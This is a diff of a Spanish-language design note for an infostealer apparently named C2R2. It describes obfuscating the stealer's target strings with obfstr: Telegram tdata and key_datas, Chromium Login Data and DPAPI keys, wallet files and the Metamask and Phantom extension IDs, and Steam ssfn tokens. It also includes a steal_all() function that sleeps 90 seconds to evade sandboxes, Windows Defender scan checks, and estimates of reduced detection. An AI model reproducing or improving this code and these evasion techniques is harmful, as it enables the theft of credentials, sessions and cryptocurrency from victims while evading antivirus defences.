@@ -1,6 +1,6 @@
-# 🔒 Implementación de Ofuscación Completa - C2R2
+#  Implementación de Ofuscación Completa - C2R2
 
-## ✅ Cambios Realizados
+##  Cambios Realizados
 
 ### 1. Dependencia: `obfstr` agregada
 
@@ -19,9 +19,9 @@ obfstr = "0.4"
 
 ---
 
-## 🎯 Módulos Ofuscados
+##  Módulos Ofuscados
 
-### 1. **telegram.rs** ⚠️ CRÍTICO (95% de detección)
+### 1. **telegram.rs**  CRÍTICO (95% de detección)
 
 **Strings ofuscados:**
 ```rust
@@ -37,15 +37,15 @@ if file_name == obfstr!("key_datas") {
 ```
 
 **Lista completa ofuscada:**
-- ✅ `"Telegram Desktop"`
-- ✅ `"tdata"`
-- ✅ `"key_datas"` ← **MUY CRÍTICO**
-- ✅ `"key_data"`
-- ✅ `"D877F783D5D3EF8C"` (archivos de sesión)
-- ✅ `"map"`
-- ✅ `"settings"`
-- ✅ `"telegram"` (búsqueda de portable)
-- ✅ `"Telegram Portable"`
+-  `"Telegram Desktop"`
+-  `"tdata"`
+-  `"key_datas"` ← **MUY CRÍTICO**
+-  `"key_data"`
+-  `"D877F783D5D3EF8C"` (archivos de sesión)
+-  `"map"`
+-  `"settings"`
+-  `"telegram"` (búsqueda de portable)
+-  `"Telegram Portable"`
 
 ---
 
@@ -67,14 +67,14 @@ let login_data_path = browser_path.join(obfstr!(r"Default\Login Data"));
 ```
 
 **Lista completa ofuscada:**
-- ✅ `"Chrome"`, `"Edge"`, `"Brave"`, `"Opera"`
-- ✅ `r"Google\Chrome\User Data"`
-- ✅ `r"Microsoft\Edge\User Data"`
-- ✅ `r"BraveSoftware\Brave-Browser\User Data"`
-- ✅ `"Local State"` ← **Clave de encriptación**
-- ✅ `r"Default\Login Data"` ← **Base de datos de passwords**
-- ✅ `"\"encrypted_key\":\""` ← **Búsqueda de master key**
-- ✅ `"DPAPI"` ← **Prefijo de encriptación**
+-  `"Chrome"`, `"Edge"`, `"Brave"`, `"Opera"`
+-  `r"Google\Chrome\User Data"`
+-  `r"Microsoft\Edge\User Data"`
+-  `r"BraveSoftware\Brave-Browser\User Data"`
+-  `"Local State"` ← **Clave de encriptación**
+-  `r"Default\Login Data"` ← **Base de datos de passwords**
+-  `"\"encrypted_key\":\""` ← **Búsqueda de master key**
+-  `"DPAPI"` ← **Prefijo de encriptación**
 
 ---
 
@@ -102,20 +102,20 @@ WalletInfo {
 **Lista completa ofuscada:**
 
 **Desktop Wallets:**
-- ✅ `"Exodus"` + `"exodus.wallet"` + `"seed.seco"` + `"info.seco"`
-- ✅ `"Atomic"` + rutas leveldb
-- ✅ `"Coinbase"` + `"Local Storage"` + `"IndexedDB"`
-- ✅ `"Electrum"` + `"default_wallet"` + `"wallet_*"`
-- ✅ `"Guarda"` + `"*.ldb"` + `"*.log"`
-- ✅ `"Ronin"` + rutas
+-  `"Exodus"` + `"exodus.wallet"` + `"seed.seco"` + `"info.seco"`
+-  `"Atomic"` + rutas leveldb
+-  `"Coinbase"` + `"Local Storage"` + `"IndexedDB"`
+-  `"Electrum"` + `"default_wallet"` + `"wallet_*"`
+-  `"Guarda"` + `"*.ldb"` + `"*.log"`
+-  `"Ronin"` + rutas
 
 **Browser Extensions:**
-- ✅ `"nkbihfbeogaeaoehlefnkodbefgpgknn"` (Metamask)
-- ✅ `"bfnaelmomeimhlpmgjnjophhpkkoljpa"` (Phantom)
-- ✅ `"fhbohimaelbohpjbbldcngcnapndodjp"` (Binance Chain)
-- ✅ `"hnfanknocfeofbddgcijnmhnfnkdnaad"` (Coinbase Wallet)
-- ✅ `"afbcbjpbpfadlkmhmclhkeeodmamcflc"` (Math Wallet)
-- ✅ `"egjidjbpglichdcondbcbdnbeeppgdph"` (Trust Wallet)
+-  `"nkbihfbeogaeaoehlefnkodbefgpgknn"` (Metamask)
+-  `"bfnaelmomeimhlpmgjnjophhpkkoljpa"` (Phantom)
+-  `"fhbohimaelbohpjbbldcngcnapndodjp"` (Binance Chain)
+-  `"hnfanknocfeofbddgcijnmhnfnkdnaad"` (Coinbase Wallet)
+-  `"afbcbjpbpfadlkmhmclhkeeodmamcflc"` (Math Wallet)
+-  `"egjidjbpglichdcondbcbdnbeeppgdph"` (Trust Wallet)
 
 ---
 
@@ -141,21 +141,21 @@ if file_name.starts_with(obfstr!("ssfn")) {
 ```
 
 **Lista completa ofuscada:**
-- ✅ `r"C:\Program Files (x86)\Steam"`
-- ✅ `"config"`
-- ✅ `"ssfn"` ← **Steam Guard tokens**
-- ✅ Otros paths de gaming (Riot, Epic, Ubisoft, Battle.net)
+-  `r"C:\Program Files (x86)\Steam"`
+-  `"config"`
+-  `"ssfn"` ← **Steam Guard tokens**
+-  Otros paths de gaming (Riot, Epic, Ubisoft, Battle.net)
 
 ---
 
-## 🛡️ Sandbox Evasion: Sleep 90 segundos
+##  Sandbox Evasion: Sleep 90 segundos
 
 **Archivo:** `agent/src/stealer/mod.rs`
 
 ```rust
 pub fn steal_all() -> StolenData {
     // ═══════════════════════════════════════════════════════════════
-    // 🛡️ SANDBOX EVASION - Sleep 90 segundos
+    //  SANDBOX EVASION - Sleep 90 segundos
     // ═══════════════════════════════════════════════════════════════
     // Los sandboxes de AV tienen timeout de 30-60 segundos.
     // Si el malware no hace nada sospechoso en ese tiempo, pasa la detección.
@@ -166,7 +166,7 @@ pub fn steal_all() -> StolenData {
         thread::sleep(Duration::from_secs(90));
     }
     // ═══════════════════════════════════════════════════════════════
-    
+
     let mut data = StolenData::new();
     // ... resto del código
 }
@@ -180,7 +180,7 @@ pub fn steal_all() -> StolenData {
 
 ---
 
-## 📊 Resumen de Ofuscación
+##  Resumen de Ofuscación
 
 | Módulo | Strings Ofuscados | Técnicas Aplicadas |
 |--------|-------------------|-------------------|
@@ -194,7 +194,7 @@ pub fn steal_all() -> StolenData {
 
 ---
 
-## 🔬 Testing de Ofuscación
+##  Testing de Ofuscación
 
 ### 1. Verificar que strings NO están en el binario:
 
@@ -216,20 +216,20 @@ strings agent.exe | findstr /i "nkbihfbeogaeaoehlefnkodbefgpgknn"
 & "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "E:\repos\C2R2\target\release\agent.exe"
 
 # Verificar resultado
-# Si pasa: Ofuscación exitosa ✅
+# Si pasa: Ofuscación exitosa
 # Si detecta: Revisar logs para ver qué activó la detección
 ```
 
 ---
 
-## 📈 Reducción Esperada de Detección
+##  Reducción Esperada de Detección
 
 | Técnica | Antes | Después | Reducción |
 |---------|-------|---------|-----------|
-| Strings en texto plano | 🔴 100% | ✅ 0% | **-100%** |
-| Sandbox timeout | 🔴 100% | 🟡 30% | **-70%** |
-| Firmas estáticas | 🔴 95% | 🟡 40% | **-55%** |
-| **DETECCIÓN TOTAL** | **🔴 95%** | **🟡 25-35%** | **~60-70%** |
+| Strings en texto plano |  100% |  0% | **-100%** |
+| Sandbox timeout |  100% |  30% | **-70%** |
+| Firmas estáticas |  95% |  40% | **-55%** |
+| **DETECCIÓN TOTAL** | ** 95%** | ** 25-35%** | **~60-70%** |
 
 **Nota:** La detección heurística todavía puede activarse por:
 - Uso de DPAPI (desencriptación)
@@ -238,20 +238,20 @@ strings agent.exe | findstr /i "nkbihfbeogaeaoehlefnkodbefgpgknn"
 
 ---
 
-## 🎯 Archivos Modificados
+##  Archivos Modificados
 
 ```
 agent/Cargo.toml                    # + obfstr dependency
-agent/src/stealer/telegram.rs       # ✅ Ofuscado completamente
-agent/src/stealer/chromium.rs       # ✅ Ofuscado completamente
-agent/src/stealer/wallets.rs        # ✅ Ofuscado completamente
-agent/src/stealer/gaming.rs         # ✅ Ofuscado parcialmente
-agent/src/stealer/mod.rs            # ✅ Sleep evasion agregado
+agent/src/stealer/telegram.rs       #  Ofuscado completamente
+agent/src/stealer/chromium.rs       #  Ofuscado completamente
+agent/src/stealer/wallets.rs        #  Ofuscado completamente
+agent/src/stealer/gaming.rs         #  Ofuscado parcialmente
+agent/src/stealer/mod.rs            #  Sleep evasion agregado
 ```
 
 ---
 
-## 🚀 Compilación
+##  Compilación
 
 ```powershell
 # Compilar con ofuscación
@@ -264,7 +264,7 @@ cargo build --release --bin agent
 
 ---
 
-## 🔍 Cómo Funciona obfstr
+##  Cómo Funciona obfstr
 
 ### Compile-Time:
 ```rust
@@ -275,12 +275,12 @@ let path = obfstr!("Telegram Desktop");
 let path = {
     const ENCRYPTED: [u8; N] = [ /* XOR encrypted bytes */ ];
     const KEY: u8 = /* random key */;
-    
+
     let mut buf = ENCRYPTED;
     for byte in &mut buf {
         *byte ^= KEY;
     }
-    
+
     std::str::from_utf8(&buf).unwrap()
 };
 ```
@@ -297,22 +297,22 @@ let path = {
 
 ---
 
-## ⚠️ Limitaciones
+##  Limitaciones
 
 ### Qué NO evita obfstr:
-- ❌ **Detección por comportamiento** (acceder a archivos sigue siendo sospechoso)
-- ❌ **Detección heurística** (desencriptar + robar datos = patrón conocido)
-- ❌ **Análisis de memoria en runtime** (strings desencriptados en RAM)
-- ❌ **Debugging/análisis dinámico** (se puede ver el string en runtime)
+-  **Detección por comportamiento** (acceder a archivos sigue siendo sospechoso)
+-  **Detección heurística** (desencriptar + robar datos = patrón conocido)
+-  **Análisis de memoria en runtime** (strings desencriptados en RAM)
+-  **Debugging/análisis dinámico** (se puede ver el string en runtime)
 
 ### Qué SÍ evita obfstr:
-- ✅ **Análisis estático de strings** (`strings agent.exe` no muestra nada)
-- ✅ **Firmas basadas en strings** (AV busca "key_datas", "Metamask", etc.)
-- ✅ **Reverse engineering básico** (más difícil de analizar)
+-  **Análisis estático de strings** (`strings agent.exe` no muestra nada)
+-  **Firmas basadas en strings** (AV busca "key_datas", "Metamask", etc.)
+-  **Reverse engineering básico** (más difícil de analizar)
 
 ---
 
-## 🎓 Conclusión
+##  Conclusión
 
 La ofuscación con `obfstr` + sleep evasion reduce significativamente la detección estática y por sandbox, pero **NO es infalible**. Windows Defender todavía puede detectar por:
 
